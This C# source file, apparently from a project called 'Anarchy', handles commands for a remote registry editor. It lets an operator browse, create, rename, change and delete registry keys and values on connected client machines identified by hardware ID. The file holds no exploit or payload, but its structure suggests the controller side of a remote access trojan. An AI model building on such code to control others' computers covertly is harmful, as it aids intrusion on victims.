using System.IO;
using System.Windows.Forms;
using Anarchy.Forms;
using Anarchy.Helpers.Helper;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;
using Microsoft.Win32;
using ProtoBuf;

namespace Anarchy.Handlers
{
    internal class HandleRegManager
    {
        public void RegManager(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                switch (unpack_msgpack.ForcePathObject("Command").AsString)
                {
                    case "RenameValue":
                        ((FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString])?.RenameValue(unpack_msgpack.ForcePathObject("keyPath").AsString, unpack_msgpack.ForcePathObject("OldValueName").AsString, unpack_msgpack.ForcePathObject("NewValueName").AsString);
                        break;
                    case "DeleteValue":
                        ((FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString])?.DeleteValue(unpack_msgpack.ForcePathObject("keyPath").AsString, unpack_msgpack.ForcePathObject("ValueName").AsString);
                        break;
                    case "LoadKey":
                        ((FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString])?.AddKeys(unpack_msgpack.ForcePathObject("RootKey").AsString, HandleRegManager.DeSerializeMatches(unpack_msgpack.ForcePathObject("Matches").GetAsBytes()));
                        break;
                    case "setClient":
                    {
                        FormRegistryEditor formRegistryEditor;
                        formRegistryEditor = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                        if (formRegistryEditor != null && formRegistryEditor.Client == null)
                        {
                            client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
                            formRegistryEditor.Client = client;
                            formRegistryEditor.timer1.Enabled = true;
                        }
                        break;
                    }
                    case "CreateValue":
                    {
                        FormRegistryEditor formRegistryEditor2;
                        formRegistryEditor2 = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                        if (formRegistryEditor2 != null)
                        {
                            string asString;
                            asString = unpack_msgpack.ForcePathObject("keyPath").AsString;
                            string asString2;
                            asString2 = unpack_msgpack.ForcePathObject("Kindstring").AsString;
                            string asString3;
                            asString3 = unpack_msgpack.ForcePathObject("newKeyName").AsString;
                            RegistryValueKind kind;
                            kind = RegistryValueKind.None;
                            switch (asString2)
                            {
                                case "11":
                                    kind = RegistryValueKind.QWord;
                                    break;
                                case "-1":
                                    kind = RegistryValueKind.None;
                                    break;
                                case "7":
                                    kind = RegistryValueKind.MultiString;
                                    break;
                                case "4":
                                    kind = RegistryValueKind.DWord;
                                    break;
                                case "0":
                                    kind = RegistryValueKind.Unknown;
                                    break;
                                case "1":
                                    kind = RegistryValueKind.String;
                                    break;
                                case "2":
                                    kind = RegistryValueKind.ExpandString;
                                    break;
                                case "3":
                                    kind = RegistryValueKind.Binary;
                                    break;
                            }
                            RegistrySeeker.RegValueData regValueData;
                            regValueData = new RegistrySeeker.RegValueData();
                            regValueData.Name = asString3;
                            regValueData.Kind = kind;
                            regValueData.Data = new byte[0];
                            formRegistryEditor2.CreateValue(asString, regValueData);
                        }
                        break;
                    }
                    case "DeleteKey":
                        ((FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString])?.DeleteKey(unpack_msgpack.ForcePathObject("ParentPath").AsString, unpack_msgpack.ForcePathObject("KeyName").AsString);
                        break;
                    case "ChangeValue":
                        ((FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString])?.ChangeValue(unpack_msgpack.ForcePathObject("keyPath").AsString, HandleRegManager.DeSerializeRegValueData(unpack_msgpack.ForcePathObject("Value").GetAsBytes()));
                        break;
                    case "CreateKey":
                        ((FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString])?.CreateNewKey(unpack_msgpack.ForcePathObject("ParentPath").AsString, HandleRegManager.DeSerializeMatch(unpack_msgpack.ForcePathObject("Match").GetAsBytes()));
                        break;
                    case "RenameKey":
                        ((FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString])?.RenameKey(unpack_msgpack.ForcePathObject("rootKey").AsString, unpack_msgpack.ForcePathObject("oldName").AsString, unpack_msgpack.ForcePathObject("newName").AsString);
                        break;
                }
            }
            catch
            {
            }
        }

        public static RegistrySeeker.RegSeekerMatch[] DeSerializeMatches(byte[] bytes)
        {
            using MemoryStream source = new MemoryStream(bytes);
            return Serializer.Deserialize<RegistrySeeker.RegSeekerMatch[]>(source);
        }

        public static RegistrySeeker.RegSeekerMatch DeSerializeMatch(byte[] bytes)
        {
            using MemoryStream source = new MemoryStream(bytes);
            return Serializer.Deserialize<RegistrySeeker.RegSeekerMatch>(source);
        }

        public static RegistrySeeker.RegValueData DeSerializeRegValueData(byte[] bytes)
        {
            using MemoryStream source = new MemoryStream(bytes);
            return Serializer.Deserialize<RegistrySeeker.RegValueData>(source);
        }
    }
}
